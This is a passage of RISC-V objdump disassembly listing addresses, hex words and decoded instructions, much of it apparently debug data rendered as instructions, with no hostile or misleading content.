     af4:	0000                	unimp
     af6:	0000                	unimp
     af8:	00000b27          	0xb27
     afc:	6a29                	lui	s4,0xa
     afe:	0200                	addi	s0,sp,256
     b00:	cc70                	sw	a2,92(s0)
     b02:	0008                	0x8
     b04:	0200                	addi	s0,sp,256
     b06:	5891                	li	a7,-28
     b08:	ec28                	sd	a0,88(s0)
     b0a:	00800013          	li	zero,8
     b0e:	0000                	unimp
     b10:	1c00                	addi	s0,sp,560
     b12:	0000                	unimp
     b14:	0000                	unimp
     b16:	0000                	unimp
     b18:	2900                	fld	fs0,16(a0)
     b1a:	8002006b          	0x8002006b
     b1e:	000008d7          	0x8d7
     b22:	9102                	jalr	sp
     b24:	0050                	addi	a2,sp,4
     b26:	2a00                	fld	fs0,16(a2)
     b28:	142a                	slli	s0,s0,0x2a
     b2a:	8000                	0x8000
     b2c:	0000                	unimp
     b2e:	0000                	unimp
     b30:	000c                	0xc
     b32:	0000                	unimp
     b34:	0000                	unimp
     b36:	0000                	unimp
     b38:	0b4c                	addi	a1,sp,404
     b3a:	0000                	unimp
     b3c:	0001f327          	0x1f327
     b40:	0200                	addi	s0,sp,256
     b42:	7f8c                	ld	a1,56(a5)
     b44:	0000                	unimp
     b46:	0300                	addi	s0,sp,384
     b48:	b891                	j	39c <_tbss_end+0x318>
     b4a:	007f                	0x7f
     b4c:	5428                	lw	a0,104(s0)
     b4e:	0014                	0x14
     b50:	0080                	addi	s0,sp,64
     b52:	0000                	unimp
     b54:	0c00                	addi	s0,sp,528
     b56:	0000                	unimp
     b58:	0000                	unimp
     b5a:	0000                	unimp
     b5c:	2700                	fld	fs0,8(a4)
     b5e:	000001f3          	0x1f3
     b62:	8e02                	jr	t3
     b64:	007f                	0x7f
     b66:	0000                	unimp
     b68:	7fa89103          	lh	sp,2042(a7) # 47fa <_tbss_end+0x4776>
     b6c:	0000                	unimp
     b6e:	0000                	unimp
     b70:	d708                	sw	a0,40(a4)
     b72:	0008                	0x8
     b74:	8000                	0x8000
     b76:	0900000b          	0x900000b
     b7a:	007f                	0x7f
     b7c:	0000                	unimp
     b7e:	00ff                	0xff
     b80:	0002d72b          	0x2d72b
     b84:	0200                	addi	s0,sp,256
     b86:	0238                	addi	a4,sp,264
     b88:	0012                	c.slli	zero,0x4
     b8a:	0080                	addi	s0,sp,64
     b8c:	0000                	unimp
     b8e:	c000                	sw	s0,0(s0)
     b90:	0000                	unimp
     b92:	0000                	unimp
     b94:	0000                	unimp
     b96:	0100                	addi	s0,sp,128
     b98:	029c                	addi	a5,sp,320
     b9a:	000c                	0xc
     b9c:	2c00                	fld	fs0,24(s0)
     b9e:	6469                	lui	s0,0x1a
     ba0:	0078                	addi	a4,sp,12
     ba2:	3802                	fld	fa6,32(sp)
     ba4:	000008d7          	0x8d7
     ba8:	9102                	jalr	sp
     baa:	2d48                	fld	fa0,152(a0)
     bac:	000003c7          	fmsub.s	ft7,ft0,ft0,ft0,rne
     bb0:	3802                	fld	fa6,32(sp)
     bb2:	000008d7          	0x8d7
     bb6:	9102                	jalr	sp
     bb8:	2740                	fld	fs0,136(a4)
     bba:	00fc                	addi	a5,sp,76
     bbc:	0000                	unimp
     bbe:	3902                	fld	fs2,32(sp)
     bc0:	08c1                	addi	a7,a7,16
     bc2:	0000                	unimp
     bc4:	9102                	jalr	sp
     bc6:	0069296f          	jal	s2,92bcc <_tbss_end+0x92b48>
     bca:	3a02                	fld	fs4,32(sp)
     bcc:	000008d7          	0x8d7
     bd0:	9102                	jalr	sp
     bd2:	2760                	fld	fs0,200(a4)
     bd4:	0090                	addi	a2,sp,64
     bd6:	0000                	unimp
     bd8:	3b02                	fld	fs6,32(sp)
     bda:	000008d7          	0x8d7
     bde:	9102                	jalr	sp
     be0:	2858                	fld	fa4,144(s0)
     be2:	12aa                	slli	t0,t0,0x2a
     be4:	8000                	0x8000
     be6:	0000                	unimp
     be8:	0000                	unimp
     bea:	000c                	0xc
     bec:	0000                	unimp
     bee:	0000                	unimp
     bf0:	0000                	unimp
     bf2:	0001f327          	0x1f327
     bf6:	0200                	addi	s0,sp,256
     bf8:	7f5c                	ld	a5,184(a4)
     bfa:	0000                	unimp
     bfc:	0200                	addi	s0,sp,256
     bfe:	5091                	li	ra,-28
     c00:	0000                	unimp
     c02:	00035d2b          	0x35d2b
     c06:	0200                	addi	s0,sp,256
     c08:	1620                	addi	s0,sp,808
     c0a:	0011                	c.nop	4
     c0c:	0080                	addi	s0,sp,64
     c0e:	0000                	unimp
     c10:	ec00                	sd	s0,24(s0)
     c12:	0000                	unimp
     c14:	0000                	unimp
     c16:	0000                	unimp
     c18:	0100                	addi	s0,sp,128
     c1a:	769c                	ld	a5,40(a3)
     c1c:	000c                	0xc
     c1e:	2d00                	fld	fs0,24(a0)
     c20:	0259                	addi	tp,tp,22
     c22:	0000                	unimp
     c24:	2002                	fld	ft0,0(sp)
     c26:	0c76                	slli	s8,s8,0x1d
     c28:	0000                	unimp
     c2a:	9102                	jalr	sp
     c2c:	2d58                	fld	fa4,152(a0)
     c2e:	0236                	slli	tp,tp,0xd
     c30:	0000                	unimp
     c32:	2002                	fld	ft0,0(sp)
     c34:	000008d7          	0x8d7
     c38:	9102                	jalr	sp
     c3a:	2d50                	fld	fa2,152(a0)
     c3c:	000004fb          	0x4fb
     c40:	2002                	fld	ft0,0(sp)
     c42:	0c7c                	addi	a5,sp,540
     c44:	0000                	unimp
     c46:	9102                	jalr	sp
     c48:	2d48                	fld	fa0,152(a0)
     c4a:	019c                	addi	a5,sp,192
     c4c:	0000                	unimp
     c4e:	2002                	fld	ft0,0(sp)
     c50:	0c76                	slli	s8,s8,0x1d
     c52:	0000                	unimp
     c54:	9102                	jalr	sp
     c56:	2840                	fld	fs0,144(s0)
     c58:	113e                	slli	sp,sp,0x2f
     c5a:	8000                	0x8000
     c5c:	0000                	unimp
     c5e:	0000                	unimp
     c60:	00bc                	addi	a5,sp,72
     c62:	0000                	unimp
     c64:	0000                	unimp
     c66:	0000                	unimp
     c68:	6929                	lui	s2,0xa
     c6a:	0200                	addi	s0,sp,256
     c6c:	d724                	sw	s1,104(a4)
     c6e:	0008                	0x8
     c70:	0200                	addi	s0,sp,256
     c72:	6891                	lui	a7,0x4
     c74:	0000                	unimp
     c76:	08d7080f          	0x8d7080f
     c7a:	0000                	unimp
     c7c:	08c1080f          	0x8c1080f
     c80:	0000                	unimp
     c82:	8a2e                	mv	s4,a1
     c84:	0002                	c.slli	zero,0x0
     c86:	0100                	addi	s0,sp,128
     c88:	4846                	lw	a6,80(sp)
     c8a:	0010                	0x10
     c8c:	0080                	addi	s0,sp,64
     c8e:	0000                	unimp
     c90:	ce00                	sw	s0,24(a2)
     c92:	0000                	unimp
     c94:	0000                	unimp
     c96:	0000                	unimp
     c98:	0100                	addi	s0,sp,128
     c9a:	2d9c                	fld	fa5,24(a1)
     c9c:	0090                	addi	a2,sp,64
     c9e:	0000                	unimp
     ca0:	4601                	li	a2,0
     ca2:	000008d7          	0x8d7
     ca6:	7fa89103          	lh	sp,2042(a7) # 47fa <_tbss_end+0x4776>
     caa:	732c                	ld	a1,96(a4)
     cac:	007a                	c.slli	zero,0x1e
     cae:	4601                	li	a2,0
     cb0:	000008d7          	0x8d7
     cb4:	7fa09103          	lh	sp,2042(ra) # 47fa <_tbss_end+0x4776>
     cb8:	0003ed27          	0x3ed27
     cbc:	0100                	addi	s0,sp,128
     cbe:	d74c                	sw	a1,44(a4)
     cc0:	0008                	0x8
     cc2:	0200                	addi	s0,sp,256
     cc4:	6891                	lui	a7,0x4
     cc6:	0000fc27          	0xfc27
     cca:	0100                	addi	s0,sp,128
     ccc:	0008c15b          	0x8c15b
     cd0:	0200                	addi	s0,sp,256
     cd2:	5791                	li	a5,-28
     cd4:	00055527          	0x55527
     cd8:	0100                	addi	s0,sp,128
     cda:	d761                	beqz	a4,ca2 <_tbss_end+0xc1e>
     cdc:	0008                	0x8
     cde:	0200                	addi	s0,sp,256
     ce0:	4891                	li	a7,4
     ce2:	a028                	fsd	fa0,64(s0)
     ce4:	0010                	0x10
     ce6:	0080                	addi	s0,sp,64
     ce8:	0000                	unimp
     cea:	6e00                	ld	s0,24(a2)
     cec:	0000                	unimp
     cee:	0000                	unimp
     cf0:	0000                	unimp
     cf2:	2900                	fld	fs0,16(a0)
     cf4:	0069                	c.nop	26
     cf6:	6401                	0x6401
     cf8:	000008d7          	0x8d7
     cfc:	9102                	jalr	sp
     cfe:	2860                	fld	fs0,208(s0)
     d00:	10a6                	slli	ra,ra,0x29
     d02:	8000                	0x8000
     d04:	0000                	unimp
     d06:	0000                	unimp
     d08:	0052                	c.slli	zero,0x14
     d0a:	0000                	unimp
     d0c:	0000                	unimp
     d0e:	0000                	unimp
     d10:	00003c27          	fsd	ft0,24(zero) # 18 <_tdata_begin+0x18>
     d14:	0100                	addi	s0,sp,128
     d16:	0008d767          	0x8d767
     d1a:	0200                	addi	s0,sp,256
     d1c:	4091                	li	ra,4
     d1e:	bc28                	fsd	fa0,120(s0)
     d20:	0010                	0x10
     d22:	0080                	addi	s0,sp,64
     d24:	0000                	unimp
     d26:	3c00                	fld	fs0,56(s0)
     d28:	0000                	unimp
     d2a:	0000                	unimp
     d2c:	0000                	unimp
     d2e:	2900                	fld	fs0,16(a0)
     d30:	006a                	c.slli	zero,0x1a
     d32:	6b01                	0x6b01
     d34:	000008d7          	0x8d7
     d38:	9102                	jalr	sp
     d3a:	2858                	fld	fa4,144(s0)
     d3c:	10c2                	slli	ra,ra,0x30
     d3e:	8000                	0x8000
     d40:	0000                	unimp
     d42:	0000                	unimp
     d44:	0022                	c.slli	zero,0x8
     d46:	0000                	unimp
     d48:	0000                	unimp
     d4a:	0000                	unimp
     d4c:	0000d827          	0xd827
     d50:	0100                	addi	s0,sp,128
     d52:	d76e                	sw	s11,172(sp)
     d54:	0008                	0x8
     d56:	0300                	addi	s0,sp,384
     d58:	b891                	j	5ac <_tbss_end+0x528>
     d5a:	007f                	0x7f
     d5c:	0000                	unimp
     d5e:	0000                	unimp
     d60:	2a00                	fld	fs0,16(a2)
     d62:	0000                	unimp
     d64:	0200                	addi	s0,sp,256
     d66:	6e00                	ld	s0,24(a2)
     d68:	0002                	c.slli	zero,0x0
     d6a:	0800                	addi	s0,sp,16
     d6c:	a701                	j	146c <_tbss_end+0x13e8>
     d6e:	00000003          	lb	zero,0(zero) # 0 <_tdata_begin>
     d72:	0000                	unimp
     d74:	0080                	addi	s0,sp,64
     d76:	0000                	unimp
     d78:	c600                	sw	s0,8(a2)
     d7a:	0001                	nop
     d7c:	0080                	addi	s0,sp,64
     d7e:	0000                	unimp
     d80:	0d00                	addi	s0,sp,656
     d82:	0006                	c.slli	zero,0x1
     d84:	3f00                	fld	fs0,56(a4)
     d86:	0001                	nop
     d88:	1700                	addi	s0,sp,928
     d8a:	0006                	c.slli	zero,0x1
     d8c:	0100                	addi	s0,sp,128
     d8e:	2a80                	fld	fs0,16(a3)
     d90:	0000                	unimp
     d92:	0200                	addi	s0,sp,256
     d94:	8200                	0x8200
     d96:	0002                	c.slli	zero,0x0
     d98:	0800                	addi	s0,sp,16
     d9a:	9f01                	subw	a4,a4,s0
     d9c:	a8000007          	0xa8000007
     da0:	0014                	0x14
     da2:	0080                	addi	s0,sp,64
     da4:	0000                	unimp
     da6:	d600                	sw	s0,40(a2)
     da8:	0014                	0x14
     daa:	0080                	addi	s0,sp,64
     dac:	0000                	unimp
     dae:	2300                	fld	fs0,0(a4)
     db0:	0006                	c.slli	zero,0x1
     db2:	3f00                	fld	fs0,56(a4)
     db4:	0001                	nop
     db6:	1700                	addi	s0,sp,928
     db8:	0006                	c.slli	zero,0x1
     dba:	0100                	addi	s0,sp,128
     dbc:	8f80                	0x8f80
     dbe:	0016                	c.slli	zero,0x5
     dc0:	0400                	addi	s0,sp,512
     dc2:	9600                	0x9600
     dc4:	0002                	c.slli	zero,0x0
     dc6:	0800                	addi	s0,sp,16
     dc8:	e901                	bnez	a0,dd8 <_tbss_end+0xd54>
     dca:	0002                	c.slli	zero,0x0
     dcc:	0c00                	addi	s0,sp,528
     dce:	06f6                	slli	a3,a3,0x1d
     dd0:	0000                	unimp
     dd2:	0000013f 800014d6 	0x800014d60000013f
     dda:	0000                	unimp
     ddc:	0000                	unimp
     dde:	11ea                	slli	gp,gp,0x3a
     de0:	0000                	unimp
     de2:	0000                	unimp
     de4:	0000                	unimp
     de6:	0000082b          	0x82b
     dea:	0102                	slli	sp,sp,0x0
     dec:	fc06                	sd	ra,56(sp)
     dee:	02000003          	lb	zero,32(zero) # 20 <_tdata_begin+0x20>
     df2:	0801                	addi	a6,a6,0
     df4:	03fa                	slli	t2,t2,0x1e
     df6:	0000                	unimp
     df8:	0202                	slli	tp,tp,0x0
     dfa:	1f05                	addi	t5,t5,-31
     dfc:	0004                	0x4
     dfe:	0200                	addi	s0,sp,256
     e00:	0702                	slli	a4,a4,0x0
     e02:	026e                	slli	tp,tp,0x1b
     e04:	0000                	unimp
     e06:	69050403          	lb	s0,1680(a0) # 29dd8 <_tbss_end+0x29d54>
     e0a:	746e                	ld	s0,248(sp)
     e0c:	0400                	addi	s0,sp,512
     e0e:	0049                	c.nop	18
     e10:	0000                	unimp
     e12:	5005                	c.li	zero,-31
     e14:	0000                	unimp
     e16:	0500                	addi	s0,sp,640
     e18:	0049                	c.nop	18
     e1a:	0000                	unimp
     e1c:	0402                	slli	s0,s0,0x0
     e1e:	00007a07          	0x7a07
     e22:	0200                	addi	s0,sp,256
     e24:	0508                	addi	a0,sp,640
     e26:	000000e7          	jalr	zero
     e2a:	b506                	fsd	ft1,168(sp)
     e2c:	04000003          	lb	zero,64(zero) # 40 <buf.2848>
     e30:	7869                	lui	a6,0xffffa
     e32:	0000                	unimp
     e34:	0200                	addi	s0,sp,256
     e36:	0708                	addi	a0,sp,896
     e38:	0075                	c.nop	29
     e3a:	0000                	unimp
     e3c:	da06                	sw	ra,52(sp)
     e3e:	04000007          	0x4000007
     e42:	78e8                	ld	a0,240(s1)
     e44:	0000                	unimp
     e46:	0600                	addi	s0,sp,768
     e48:	000003b7          	lui	t2,0x0
     e4c:	3c05                	addiw	s8,s8,-31
     e4e:	006d                	c.nop	27
     e50:	0000                	unimp
     e52:	8a04                	0x8a04
     e54:	0000                	unimp
     e56:	0600                	addi	s0,sp,768
     e58:	07dc                	addi	a5,sp,964
     e5a:	0000                	unimp
     e5c:	5205                	li	tp,-31
     e5e:	007f                	0x7f
     e60:	0000                	unimp
     e62:	9a05                	andi	a2,a2,-31
     e64:	0000                	unimp
     e66:	0600                	addi	s0,sp,768
     e68:	0584                	addi	s1,sp,704
     e6a:	0000                	unimp
     e6c:	d806                	sw	ra,48(sp)
     e6e:	0078                	addi	a4,sp,12
     e70:	0000                	unimp
     e72:	0802                	slli	a6,a6,0x0
     e74:	e205                	bnez	a2,e94 <_tbss_end+0xe10>
     e76:	0000                	unimp
     e78:	0200                	addi	s0,sp,256
     e7a:	0410                	addi	a2,sp,512
     e7c:	00000367          	jalr	t1,zero
     e80:	db06                	sw	ra,180(sp)
     e82:	07000003          	lb	zero,112(zero) # 70 <buf.2848+0x30>
     e86:	00004907          	flq	fs2,0(zero) # 0 <_tdata_begin>
     e8a:	0600                	addi	s0,sp,768
     e8c:	03a0                	addi	s0,sp,456
     e8e:	0000                	unimp
     e90:	2c08                	fld	fa0,24(s0)
     e92:	0066                	c.slli	zero,0x19
     e94:	0000                	unimp
     e96:	db06                	sw	ra,180(sp)
     e98:	0004                	0x4
     e9a:	0800                	addi	s0,sp,16
     e9c:	6672                	ld	a2,280(sp)
     e9e:	0000                	unimp
     ea0:	0600                	addi	s0,sp,768
     ea2:	0582                	slli	a1,a1,0x0
     ea4:	0000                	unimp
     ea6:	9108                	0x9108
     ea8:	0066                	c.slli	zero,0x19
     eaa:	0000                	unimp
     eac:	0002c207          	flq	ft4,0(t0) # 2000 <_tbss_end+0x1f7c>
     eb0:	0600                	addi	s0,sp,768
     eb2:	0165                	addi	sp,sp,25
     eb4:	005f 0000 0408      	0x4080000005f
     eba:	a608                	fsd	fa0,8(a2)
     ebc:	011a                	slli	sp,sp,0x6
     ebe:	0000                	unimp
     ec0:	0c09                	addi	s8,s8,2
     ec2:	0001                	nop
     ec4:	0800                	addi	s0,sp,16
     ec6:	efa8                	sd	a0,88(a5)
     ec8:	0000                	unimp
     eca:	0900                	addi	s0,sp,144
     ecc:	0242                	slli	tp,tp,0x10
     ece:	0000                	unimp
     ed0:	a908                	fsd	fa0,16(a0)
     ed2:	011a                	slli	sp,sp,0x6
     ed4:	0000                	unimp
     ed6:	0a00                	addi	s0,sp,272
     ed8:	0034                	addi	a3,sp,8
     eda:	0000                	unimp
     edc:	012a                	slli	sp,sp,0xa
     ede:	0000                	unimp
     ee0:	0000780b          	0x780b
     ee4:	0300                	addi	s0,sp,384
     ee6:	0c00                	addi	s0,sp,528
     ee8:	0808                	addi	a0,sp,16
     eea:	00014ba3          	0x14ba3
     eee:	0d00                	addi	s0,sp,656
     ef0:	04c5                	addi	s1,s1,17
     ef2:	0000                	unimp
     ef4:	a508                	fsd	fa0,8(a0)
     ef6:	0049                	c.nop	18
     ef8:	0000                	unimp
     efa:	0d00                	addi	s0,sp,656
     efc:	04cd                	addi	s1,s1,19
     efe:	0000                	unimp
     f00:	aa08                	fsd	fa0,16(a2)
     f02:	000000fb          	0xfb
     f06:	0004                	0x4
     f08:	4706                	lw	a4,64(sp)
     f0a:	0004                	0x4
     f0c:	0800                	addi	s0,sp,16
     f0e:	00012aab          	0x12aab
     f12:	0600                	addi	s0,sp,768
     f14:	01f9                	addi	gp,gp,30
     f16:	0000                	unimp
     f18:	af08                	fsd	fa0,24(a4)
     f1a:	000000c3          	fmadd.s	ft1,ft0,ft0,ft0,rne
     f1e:	080e                	slli	a6,a6,0x3
     f20:	0169080f          	0x169080f
     f24:	0000                	unimp
     f26:	0102                	slli	sp,sp,0x0
     f28:	0308                	addi	a0,sp,384
     f2a:	0004                	0x4
     f2c:	0500                	addi	s0,sp,640
     f2e:	0169                	addi	sp,sp,26
     f30:	0000                	unimp
     f32:	2d06                	fld	fs10,64(sp)
     f34:	0005                	c.nop	1
     f36:	0900                	addi	s0,sp,144
     f38:	5f19                	li	t5,-26
     f3a:	0000                	unimp
     f3c:	1000                	addi	s0,sp,32
     f3e:	020a                	slli	tp,tp,0x2
     f40:	0000                	unimp
     f42:	0920                	addi	s0,sp,152
     f44:	0001d32f          	0x1d32f
     f48:	0d00                	addi	s0,sp,656
     f4a:	0468                	addi	a0,sp,524
     f4c:	0000                	unimp
     f4e:	3109                	addiw	sp,sp,-30
     f50:	000001d3          	fadd.s	ft3,ft0,ft0,rne
     f54:	1100                	addi	s0,sp,160
     f56:	6b5f 0900 4932      	0x493209006b5f
     f5c:	0000                	unimp
     f5e:	0800                	addi	s0,sp,16
     f60:	b00d                	j	782 <_tbss_end+0x6fe>
     f62:	0004                	0x4
     f64:	0900                	addi	s0,sp,144
     f66:	4932                	lw	s2,12(sp)
     f68:	0000                	unimp
     f6a:	0c00                	addi	s0,sp,528
     f6c:	ed0d                	bnez	a0,fa6 <_tbss_end+0xf22>
     f6e:	0001                	nop
     f70:	0900                	addi	s0,sp,144
     f72:	4932                	lw	s2,12(sp)
     f74:	0000                	unimp
     f76:	1000                	addi	s0,sp,32
     f78:	6d0d                	lui	s10,0x3
     f7a:	0005                	c.nop	1
     f7c:	0900                	addi	s0,sp,144
     f7e:	4932                	lw	s2,12(sp)
     f80:	0000                	unimp
     f82:	1400                	addi	s0,sp,544
     f84:	5f11                	li	t5,-28
     f86:	0078                	addi	a4,sp,12
     f88:	3309                	addiw	t1,t1,-30
     f8a:	01d9                	addi	gp,gp,22
     f8c:	0000                	unimp
     f8e:	0018                	0x18
     f90:	0180080f          	0x180080f
     f94:	0000                	unimp
     f96:	750a                	ld	a0,160(sp)
     f98:	0001                	nop
     f9a:	e900                	sd	s0,16(a0)
     f9c:	0001                	nop
     f9e:	0b00                	addi	s0,sp,400
     fa0:	0078                	addi	a4,sp,12
     fa2:	0000                	unimp
     fa4:	0000                	unimp
     fa6:	3110                	fld	fa2,32(a0)
     fa8:	0002                	c.slli	zero,0x0
     faa:	2400                	fld	fs0,8(s0)
     fac:	3709                	addiw	a4,a4,-30
     fae:	0262                	slli	tp,tp,0x18
     fb0:	0000                	unimp
     fb2:	cf0d                	beqz	a4,fec <_tbss_end+0xf68>
     fb4:	0000                	unimp
     fb6:	0900                	addi	s0,sp,144
     fb8:	4939                	li	s2,14
     fba:	0000                	unimp
     fbc:	0000                	unimp
     fbe:	ed0d                	bnez	a0,ff8 <_tbss_end+0xf74>
     fc0:	0004                	0x4
     fc2:	0900                	addi	s0,sp,144
     fc4:	493a                	lw	s2,140(sp)
     fc6:	0000                	unimp
     fc8:	0400                	addi	s0,sp,512
     fca:	020d                	addi	tp,tp,3
     fcc:	0001                	nop
     fce:	0900                	addi	s0,sp,144
     fd0:	0000493b          	0x493b
     fd4:	0800                	addi	s0,sp,16
     fd6:	030d                	addi	t1,t1,3
     fd8:	0006                	c.slli	zero,0x1
     fda:	0900                	addi	s0,sp,144
     fdc:	493c                	lw	a5,80(a0)
     fde:	0000                	unimp
     fe0:	0c00                	addi	s0,sp,528
     fe2:	7a0d                	lui	s4,0xfffe3
     fe4:	09000003          	lb	zero,144(zero) # 90 <_tbss_end+0xc>
     fe8:	493d                	li	s2,15
     fea:	0000                	unimp
     fec:	1000                	addi	s0,sp,32
     fee:	e30d                	bnez	a4,1010 <_tbss_end+0xf8c>
     ff0:	0004                	0x4
     ff2:	0900                	addi	s0,sp,144
     ff4:	493e                	lw	s2,204(sp)
     ff6:	0000                	unimp
     ff8:	1400                	addi	s0,sp,544
     ffa:	720d                	lui	tp,0xfffe3
     ffc:	0005                	c.nop	1
     ffe:	0900                	addi	s0,sp,144
    1000:	0000493f 290d1800 	0x290d18000000493f
    1008:	0004                	0x4
    100a:	0900                	addi	s0,sp,144
    100c:	4940                	lw	s0,20(a0)
    100e:	0000                	unimp
    1010:	1c00                	addi	s0,sp,560
    1012:	ad0d                	j	1644 <_tbss_end+0x15c0>
    1014:	0005                	c.nop	1
    1016:	0900                	addi	s0,sp,144
    1018:	4941                	li	s2,16
    101a:	0000                	unimp
    101c:	2000                	fld	fs0,0(s0)
    101e:	1200                	addi	s0,sp,288
    1020:	00000117          	auipc	sp,0x0
    1024:	0208                	addi	a0,sp,256
    1026:	4a09                	li	s4,2
    1028:	000002a3          	sb	zero,5(zero) # 5 <_tdata_begin+0x5>
    102c:	e00d                	bnez	s0,104e <_tbss_end+0xfca>
    102e:	0001                	nop
    1030:	0900                	addi	s0,sp,144
    1032:	0002a34b          	fnmsub.s	ft6,ft5,ft0,ft0,rdn
    1036:	0000                	unimp
    1038:	00000013          	nop
    103c:	0900                	addi	s0,sp,144
    103e:	a34c                	fsd	fa1,128(a4)
    1040:	0002                	c.slli	zero,0x0
    1042:	0000                	unimp
    1044:	1301                	addi	t1,t1,-32
    1046:	051f 0000 4e09      	0x4e090000051f
    104c:	0175                	addi	sp,sp,29
    104e:	0000                	unimp
    1050:	0200                	addi	s0,sp,256
    1052:	00018d13          	mv	s10,gp
    1056:	0900                	addi	s0,sp,144
    1058:	7551                	lui	a0,0xffff4
    105a:	0001                	nop
    105c:	0400                	addi	s0,sp,512
    105e:	0002                	c.slli	zero,0x0
    1060:	610a                	ld	sp,128(sp)
    1062:	0001                	nop
    1064:	b300                	fsd	fs0,32(a4)
    1066:	0002                	c.slli	zero,0x0
    1068:	0b00                	addi	s0,sp,400
    106a:	0078                	addi	a4,sp,12
    106c:	0000                	unimp
    106e:	001f 8312 0003      	0x38312001f
    1074:	1800                	addi	s0,sp,48
    1076:	f25d0903          	lb	s2,-219(s10) # 2f25 <_tbss_end+0x2ea1>
    107a:	0002                	c.slli	zero,0x0
    107c:	0d00                	addi	s0,sp,656
    107e:	0468                	addi	a0,sp,524
    1080:	0000                	unimp
    1082:	5e09                	li	t3,-30
    1084:	02f2                	slli	t0,t0,0x1c
    1086:	0000                	unimp
    1088:	0d00                	addi	s0,sp,656
    108a:	0480                	addi	s0,sp,576
    108c:	0000                	unimp
    108e:	5f09                	li	t5,-30
    1090:	0049                	c.nop	18
    1092:	0000                	unimp
    1094:	0d08                	addi	a0,sp,656
    1096:	01e8                	addi	a0,sp,204
    1098:	0000                	unimp
    109a:	6109                	addi	sp,sp,128
    109c:	02f8                	addi	a4,sp,332
    109e:	0000                	unimp
    10a0:	1310                	addi	a2,sp,416
    10a2:	00000117          	auipc	sp,0x0
    10a6:	6209                	lui	tp,0x2
    10a8:	0262                	slli	tp,tp,0x18
    10aa:	0000                	unimp
    10ac:	0110                	addi	a2,sp,128
    10ae:	0f00                	addi	s0,sp,912
    10b0:	b308                	fsd	fa0,32(a4)
    10b2:	0002                	c.slli	zero,0x0
    10b4:	0a00                	addi	s0,sp,272
    10b6:	0308                	addi	a0,sp,384
    10b8:	0000                	unimp
    10ba:	0308                	addi	a0,sp,384
    10bc:	0000                	unimp
    10be:	0000780b          	0x780b
    10c2:	1f00                	addi	s0,sp,944
    10c4:	0f00                	addi	s0,sp,912
    10c6:	0e08                	addi	a0,sp,784
    10c8:	14000003          	lb	zero,320(zero) # 140 <_tbss_end+0xbc>
    10cc:	3310                	fld	fa2,32(a4)
    10ce:	0004                	0x4
    10d0:	1000                	addi	s0,sp,32
    10d2:	7509                	lui	a0,0xfffe2
    10d4:	0334                	addi	a3,sp,392
    10d6:	0000                	unimp
    10d8:	f60d                	bnez	a2,1002 <_tbss_end+0xf7e>
    10da:	0000                	unimp
    10dc:	0900                	addi	s0,sp,144
    10de:	3476                	fld	fs0,376(sp)
    10e0:	00000003          	lb	zero,0(zero) # 0 <_tdata_begin>
    10e4:	750d                	lui	a0,0xfffe3
    10e6:	0006                	c.slli	zero,0x1
    10e8:	0900                	addi	s0,sp,144
    10ea:	00004977          	0x4977
    10ee:	0800                	addi	s0,sp,16
    10f0:	0f00                	addi	s0,sp,912
    10f2:	3408                	fld	fa0,40(s0)
    10f4:	0000                	unimp
    10f6:	1000                	addi	s0,sp,32
    10f8:	0452                	slli	s0,s0,0x14
    10fa:	0000                	unimp
    10fc:	09b0                	addi	a2,sp,216
    10fe:	64b5                	lui	s1,0xd
    1100:	0004                	0x4
    1102:	1100                	addi	s0,sp,160
    1104:	705f 0900 34b6      	0x34b60900705f
    110a:	00000003          	lb	zero,0(zero) # 0 <_tdata_begin>
    110e:	5f11                	li	t5,-28
    1110:	0072                	c.slli	zero,0x1c
    1112:	b709                	j	1014 <_tbss_end+0xf90>
    1114:	0049                	c.nop	18
    1116:	0000                	unimp
    1118:	1108                	addi	a0,sp,160
    111a:	775f 0900 49b8      	0x49b80900775f
    1120:	0000                	unimp
    1122:	0c00                	addi	s0,sp,528
    1124:	860d                	srai	a2,a2,0x3
    1126:	0001                	nop
    1128:	0900                	addi	s0,sp,144
    112a:	3bb9                	addiw	s7,s7,-18
    112c:	0000                	unimp
    112e:	1000                	addi	s0,sp,32
    1130:	610d                	addi	sp,sp,160
    1132:	0002                	c.slli	zero,0x0
    1134:	0900                	addi	s0,sp,144
    1136:	3bba                	fld	fs7,424(sp)
    1138:	0000                	unimp
    113a:	1200                	addi	s0,sp,288
    113c:	5f11                	li	t5,-28
    113e:	6662                	ld	a2,24(sp)
    1140:	0900                	addi	s0,sp,144
    1142:	00030fbb          	addw	t6,t1,zero
    1146:	1800                	addi	s0,sp,48
    1148:	870d                	srai	a4,a4,0x3
    114a:	0000                	unimp
    114c:	0900                	addi	s0,sp,144
    114e:	49bc                	lw	a5,80(a1)
    1150:	0000                	unimp
    1152:	2800                	fld	fs0,16(s0)
    1154:	2f0d                	addiw	t5,t5,3
    1156:	0001                	nop
    1158:	0900                	addi	s0,sp,144
    115a:	000161c3          	fmadd.s	ft3,ft2,ft0,ft0,unknown
    115e:	3000                	fld	fs0,32(s0)
    1160:	210d                	addiw	sp,sp,3
    1162:	0002                	c.slli	zero,0x0
    1164:	0900                	addi	s0,sp,144
    1166:	bfc5                	j	1156 <_tbss_end+0x10d2>
    1168:	0005                	c.nop	1
    116a:	3800                	fld	fs0,48(s0)
    116c:	e20d                	bnez	a2,118e <_tbss_end+0x110a>
    116e:	0002                	c.slli	zero,0x0
    1170:	0900                	addi	s0,sp,144
    1172:	0005e9c7          	fmsub.s	fs3,fa1,ft0,ft0,unknown
    1176:	4000                	lw	s0,0(s0)
    1178:	d50d                	beqz	a0,10a2 <_tbss_end+0x101e>
    117a:	0004                	0x4
    117c:	0900                	addi	s0,sp,144
    117e:	0dca                	slli	s11,s11,0x12
    1180:	0006                	c.slli	zero,0x1
    1182:	4800                	lw	s0,16(s0)
    1184:	c70d                	beqz	a4,11ae <_tbss_end+0x112a>
    1186:	0005                	c.nop	1
    1188:	0900                	addi	s0,sp,144
    118a:	000627cb          	fnmsub.s	fa5,fa2,ft0,ft0,rdn
    118e:	5000                	lw	s0,32(s0)
    1190:	5f11                	li	t5,-28
    1192:	6275                	lui	tp,0x1d
    1194:	0900                	addi	s0,sp,144
    1196:	0fce                	slli	t6,t6,0x13
    1198:	58000003          	lb	zero,1408(zero) # 580 <_tbss_end+0x4fc>
    119c:	5f11                	li	t5,-28
    119e:	7075                	c.lui	zero,0xffffd
    11a0:	0900                	addi	s0,sp,144
    11a2:	000334cf          	fnmadd.s	fs1,ft6,ft0,ft0,rup
    11a6:	6800                	ld	s0,16(s0)
    11a8:	5f11                	li	t5,-28
    11aa:	7275                	lui	tp,0xffffd
    11ac:	0900                	addi	s0,sp,144
    11ae:	49d0                	lw	a2,20(a1)
    11b0:	0000                	unimp
    11b2:	7000                	ld	s0,32(s0)
